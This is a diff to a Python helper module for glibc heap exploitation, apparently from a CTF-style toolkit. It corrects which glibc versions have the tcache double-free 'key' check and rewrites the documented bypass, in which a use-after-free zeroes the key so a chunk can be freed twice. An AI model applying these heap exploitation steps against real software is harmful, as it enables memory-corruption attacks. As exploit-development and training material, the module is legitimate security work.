@@ -6,9 +6,10 @@ vs which has the tcache `key` field.
 Common pitfalls this module sidesteps:
   - Applying the safe-linking XOR on glibc <= 2.31 → fd points to garbage
   - Forgetting the XOR on glibc >= 2.32          → fd points to garbage
-  - Double-freeing into tcache on glibc >= 2.35 without bypassing the
+  - Double-freeing into tcache on glibc >= 2.29 without bypassing the
     `key` field → process aborts with `free(): double free detected
-    in tcache 2`.
+    in tcache 2`. (2.34 randomized the stored value; the check has
+    existed since 2.29 — it is NOT a 2.35 feature.)
 
 Usage from your exploit:
 
@@ -70,13 +71,17 @@ def alignment_ok(target_addr: int) -> bool:
 
 
 def key_bypass_needed(profile: dict | None = None) -> bool:
-    """True on glibc >= 2.35: a `key` field was added to tcache chunks
+    """True on glibc >= 2.29: a `key` field was added to tcache chunks
     so any double-free into tcache aborts unless you first overwrite
-    the key (via UAF / largebin overlap / direct edit).
+    the key (via UAF / largebin overlap / direct edit). glibc 2.34
+    randomized the value stored there; the CHECK dates to 2.29, so a
+    2.31 target (Ubuntu 20.04) needs this bypass too.
 
     The standard technique is:
-      1. free(victim)                        # key gets set to perthread ptr
-      2. edit(victim, p64(0) at offset 0x8)  # zero the key via UAF
+      1. free(victim)                        # key gets set (perthread ptr, or
+                                             #   the random tcache_key on 2.34+)
+      2. edit(victim, p64(0) * 2)            # zero fd AND the key at +0x08 via
+                                             #   UAF; the write MUST reach +0x08
       3. free(victim)                        # second free now succeeds
     """
     profile = profile if profile is not None else load_profile()
